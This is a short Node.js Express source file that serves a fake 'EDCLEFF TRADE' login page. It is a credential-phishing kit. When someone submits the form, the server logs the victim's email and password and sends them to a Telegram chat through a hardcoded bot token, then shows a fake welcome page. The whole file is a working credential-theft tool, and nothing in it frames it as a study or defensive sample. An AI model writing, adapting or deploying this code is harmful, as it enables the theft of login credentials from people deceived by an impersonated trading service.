const express = require('express');
const https = require('https');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

const BOT_TOKEN = '8776500357:AAF_8kD26cKyjulIiida3tULY7ZjdrJBryw';
const CHAT_ID = '7623047017';

console.log('SERVER STARTED WITH TELEGRAM');

app.get('/', (req, res) => {
  res.send(`
    <h1>EDCLEFF TRADE</h1>
    <form action="/login" method="POST">
      <input type="email" name="email" placeholder="Email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  `);
});

app.post('/login', (req, res) => {
  const { email, password } = req.body;
  console.log('Login:', email, password);
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=Login: ${email} / ${password}`;
  https.get(url);
  res.send(`<h1>Welcome ${email}</h1><a href="/">Logout</a>`);
});

app.listen(PORT, () => console.log('Server on', PORT));
